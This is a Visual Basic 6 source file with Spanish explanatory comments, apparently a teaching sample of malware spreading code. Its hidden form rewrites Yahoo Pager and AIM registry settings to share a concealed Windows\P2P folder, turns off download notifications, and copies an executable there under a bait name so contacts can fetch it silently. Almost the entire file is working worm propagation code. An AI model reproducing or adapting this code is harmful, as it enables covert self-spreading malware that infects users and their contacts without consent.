VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   3195
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   4680
   LinkTopic       =   "Form1"
   ScaleHeight     =   3195
   ScaleWidth      =   4680
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Para este codigo se esta usando la api, en vez de las
'instrucciones tipicas de vb, para que sea más facil adaptarlo
'a otro lenguaje

'Apis y constantes usadas
Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Private Declare Function RegCreateKeyEx Lib "advapi32.dll" Alias "RegCreateKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal Reserved As Long, ByVal lpClass As String, ByVal dwOptions As Long, ByVal samDesired As Long, lpSecurityAttributes As Long, phkResult As Long, lpdwDisposition As Long) As Long
Private Declare Function CreateDirectory Lib "kernel32" Alias "CreateDirectoryA" (ByVal lpPathName As String, lpSecurityAttributes As Long) As Long
Private Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long
Private Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long
Private Declare Function RegQueryInfoKey Lib "advapi32.dll" Alias "RegQueryInfoKeyA" (ByVal hKey As Long, ByVal lpClass As String, lpcbClass As Long, ByVal lpReserved As Long, lpcSubKeys As Long, lpcbMaxSubKeyLen As Long, lpcbMaxClassLen As Long, lpcValues As Long, lpcbMaxValueNameLen As Long, lpcbMaxValueLen As Long, lpcbSecurityDescriptor As Long, lpftLastWriteTime As Any) As Long
Private Declare Function RegEnumKeyEx Lib "advapi32.dll" Alias "RegEnumKeyExA" (ByVal hKey As Long, ByVal dwIndex As Long, ByVal lpName As String, lpcbName As Long, ByVal lpReserved As Long, ByVal lpClass As String, lpcbClass As Long, lpftLastWriteTime As Any) As Long
Private Declare Function SetFileAttributes Lib "kernel32" Alias "SetFileAttributesA" (ByVal lpFileName As String, ByVal dwFileAttributes As Long) As Long
Private Declare Function CopyFile Lib "kernel32" Alias "CopyFileA" (ByVal lpExistingFileName As String, ByVal lpNewFileName As String, ByVal bFailIfExists As Long) As Long

Private Const ERROR_SUCCESS = 0&
Private Const ERROR_NO_MORE_ITEMS = 259&

Private Const FILE_ATTRIBUTE_HIDDEN = &H2

Private Const REG_SZ = 1
Private Const REG_EXPAND_SZ = 2
Private Const REG_DWORD = 4

Private Const KEY_ALL_ACCESS = &H3F
Private Const REG_OPTION_NON_VOLATILE = 0

Private Const HKEY_CLASSES_ROOT As Long = &H80000000
Private Const HKEY_CURRENT_USER As Long = &H80000001
Private Const HKEY_LOCAL_MACHINE As Long = &H80000002

Private Const KEY_QUERY_VALUE As Long = &H1
Private Const KEY_ENUMERATE_SUB_KEYS = &H8

Private Sub Form_Load()
On Error Resume Next
'llamamos a P2P
Call P2P

'Terminamos, aqui podemos usar api ExitProcess(), pero solo si
'ya lo vamos a probar compilado, si lo vamos a ejecutar el
'code desde o dentro de vb, al llegar a ExitProcess se nos va
'a cerrar el vb tambien
''ExitProcess(0)
End
End Sub

Private Sub P2P()
On Error Resume Next
'Declaramos variables
Dim l As Long, hKey As Long, wpath As String
Dim SubKeys As Long, MaxSubKeyLen As Long
Dim NameKey As String, Index As Long

'Igualamos wpath a una cadena de 255 espacios, o podemos
'usar la constante MAX_PATH del api
wpath = Space$(255)

'llamamos a esta funcion para obtener el dir de win, le pasamos
'wpath, la longitud de wpath y devuelve en l la cantidad de
'bytes recuperados (osea la cantidad de letras que contiene el
'dir de win)
l = GetWindowsDirectory(wpath, Len(wpath))

'con esto descartamos lo que sobre de los 255 espacios, tomando
'solo tantos caracteres a la izquierda como esten indicados en
'l
wpath = Left$(wpath, l)

'abrimos la llave que queremos leer, usamos las opciones:
'KEY_QUERY_VALUE  porque vamos a obtener un dato sobre la llave
'KEY_ENUMERATE_SUB_KEYS porque vamos a enumerar las subllaves
'nos da el handle de la llave abierta en hkey
l = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\Yahoo\Pager\profiles", 0, KEY_QUERY_VALUE Or KEY_ENUMERATE_SUB_KEYS, hKey)

'si la api tiene exito regresa ERROR_SUCCESS (0), si no regresa
'ese valor, hubo un error y cerramos el handle de la llave
' y salimos
If l <> ERROR_SUCCESS Then: Call RegCloseKey(hKey): Exit Sub

'ahora usamos esta api para obtener el numero de subllaves
'que tiene la llave, le pasamos el handle de la llave en hkey
'y nos devuelve el numero de subllaves en SubKeys, y la can-
'tidad de letras del nombre de la subllave de nombre más
'largo en MaxSubKeyLen
'En las pruebas que hize en Win98 la llave más larga tenia 10
'caracteres y devolvia 11, osea bien porque son:
'(10 caracteres) + Null ,pero en WinXP devolvia 15
'seguramente la ando usando mal la api, pero ese dato no es
'muy importante para este fin
'Segun la declaracion de las apis que viene con vb6 como ultimo
'argumento se deberia pasar un tipo FILETIME, pero cambiamos la
'declaracion para que nos acepte un tipo long y le pasamos 0
'ya que no vamos a usar los datos d esa estructura
'si exito devuelve Error_Success
l = RegQueryInfoKey(hKey, 0&, 0&, 0&, SubKeys, MaxSubKeyLen, 0&, 0&, 0&, 0&, 0&, 0&)

'si hay subllaves y la funcion anterior tuvo exito
If (SubKeys > 0) And (l = ERROR_SUCCESS) Then

'igualamos NameKey a una cadena de 255 espacios
NameKey = Space$(255)

'luego hacemos un bucle para listar las subllaves con RegEnumKeyEx
'a esta api le pasamos el handle de la llave, Index que va
'desde 0 al numero de subllaves (deberemos ir incrementando index)
'NameKey sera la var que recibira el nombre de la subllave
'y como 4° argumento se le deberia pasar una var long, digamos
'KeyLen, que indique el tamaño de NameKey y en esa var la
'funcion regresaria la longitud en caracteres del nombre de la
'llave cosa que se pudieran descartar los espacios sobrantes con
'NameKey=Left$(NameKey,KeyLen)
'pero eso no me funka, me regresa valores que no son ¿ ?
'le pasamos 255 nomas, como ultimo argumento deberiamos pasarle
'un tipo FILETIME, pero aplicamos lo mismo que la funcion ante-
'rior, cuando index llegue al numero que indique la ultima
'subllave la funcion retorna ERROR_NO_MORE_ITEMS y salimos
'del bucle, el bucle nos escribir las llaves que queremos
'en cada subllave
Do While (RegEnumKeyEx(hKey, Index, NameKey, 255, 0&, 0&, 0&, 0&) <> ERROR_NO_MORE_ITEMS)
DoEvents

'Para descartar los espacios sobrantes de NameKey, como no me
'funko la forma como deberia ser, ubicamos el caracter
'Null ó Chr(0) de la cadena devuelta y tomamos los caracteres
'a la izquierda sin incluir el Null, asi:
'Mid(NameKey, 1, InStr(NameKey, Chr(0)) - 1)
'igualamos Public Dir al directorio que crearemos
Rw "HKCU", "Software\Yahoo\Pager\profiles\" & Mid(NameKey, 1, InStr(NameKey, Chr(0)) - 1) & "\FileTransfer", "Public Dir", wpath & "\P2P", "SZ"
'igualamos Show Get Status a 0 (DWORD)
Rw "HKCU", "Software\Yahoo\Pager\profiles\" & Mid(NameKey, 1, InStr(NameKey, Chr(0)) - 1) & "\FileTransfer", "Show Get Status", 0, "DW"
'igualamos Get Permit a 2 (DWORD)
Rw "HKCU", "Software\Yahoo\Pager\profiles\" & Mid(NameKey, 1, InStr(NameKey, Chr(0)) - 1) & "\FileTransfer", "Get Permit", 2, "DW"

'incrementamos index en 1 para obtener el nombre de la siguiente subllave
Index = Index + 1
Loop

End If

'cerramos la llave, pasando a RegCloseKey el handle de la llave
l = RegCloseKey(hKey)

'Lo mismo para el AIM
Index = 0
l = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\America Online\AOL Instant Messenger (TM)\CurrentVersion\Users", 0, KEY_QUERY_VALUE Or KEY_ENUMERATE_SUB_KEYS, hKey)
If l <> ERROR_SUCCESS Then: Call RegCloseKey(hKey): Exit Sub
l = RegQueryInfoKey(hKey, 0&, 0&, 0&, SubKeys, MaxSubKeyLen, 0&, 0&, 0&, 0&, 0&, 0&)
If (SubKeys > 0) And (l = ERROR_SUCCESS) Then
NameKey = Space$(255)
Do While (RegEnumKeyEx(hKey, Index, NameKey, 255, 0&, 0&, 0&, 0&) <> ERROR_NO_MORE_ITEMS)
DoEvents
Rw "HKCU", "Software\America Online\AOL Instant Messenger (TM)\CurrentVersion\Users\" & Mid(NameKey, 1, InStr(NameKey, Chr(0)) - 1) & "\Xfer", "DirFileLib", wpath & "\P2P", "SZ"
Rw "HKCU", "Software\America Online\AOL Instant Messenger (TM)\CurrentVersion\Users\" & Mid(NameKey, 1, InStr(NameKey, Chr(0)) - 1) & "\Xfer", "GetAllow", 2, "DW"
Rw "HKCU", "Software\America Online\AOL Instant Messenger (TM)\CurrentVersion\Users\" & Mid(NameKey, 1, InStr(NameKey, Chr(0)) - 1) & "\Xfer", "PutNoStatus", 1, "DW"
Index = Index + 1
Loop
End If
l = RegCloseKey(hKey)

'en esta api se le deberia pasar como ultimo argumento un
'tipo SECURITY_ATTRIBUTES, pero cambiamos la declaracion para
'pasar un long (0)
'creamos dentro del dir de win un directorio, que fue el
'que indicamos en el registro como dir compartido en Public Dir
Call CreateDirectory(wpath & "\P2P", ByVal 0&)

'le damos al dir el atributo de oculto
Call SetFileAttributes(wpath & "\P2P\", FILE_ATTRIBUTE_HIDDEN)

'nos copiamos al dir, tantas veces como sea necesario
'3° argumento de CopyFile:
'True para que si ya existe el archivo en la ruta de destino
'especificada para copiar, no haga nada
'False para que si el archivo ya existe lo sobreescriba
Call CopyFile("c:\test.exe", wpath & "\P2P\nombre.exe", True)
End Sub

'Sub para escribir en el reg
Private Sub Rw(rKey As String, sKey As String, nKey As String, vKey As Variant, mVal As String)
On Error Resume Next

'declaramos variables
Dim RK As Long, l As Long, hKey As Long

'un select para saber en que llave raiz vamos a escribir
Select Case rKey
Case "HKCR"
RK = HKEY_CLASSES_ROOT
Case "HKCU"
RK = HKEY_CURRENT_USER
Case "HKLM"
RK = HKEY_LOCAL_MACHINE
End Select

'Usamos RegCreateKeyEx en vez de RegOpenKeyEx porque si no existe
'la llave la crea y sino solo la abre
'REG_OPTION_NON_VOLATILE para que los datos escritos se
'conserven despues del reinicio y KEY_ALL_ACCESS para tener acceso
'total a la llave
l = RegCreateKeyEx(RK, sKey, ByVal 0&, vbNullString, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, ByVal 0&, hKey, l)

'select para ver si lo que vamos a escribir es un valor de
'cadena o dword
Select Case mVal
Case "SZ"

'si es valor de cadena, usamos REG_SZ
Dim sVal As String
 sVal = vKey
 l = RegSetValueEx(hKey, nKey, 0&, REG_SZ, ByVal sVal, Len(sVal) + 1)

'si es un valor dword usamos REG_DWORD
Case "DW"
Dim lVal As Long
lVal = vKey
 l = RegSetValueEx(hKey, nKey, 0&, REG_DWORD, lVal, 4)
End Select

'cerramos la llave
l = RegCloseKey(hKey)
End Sub
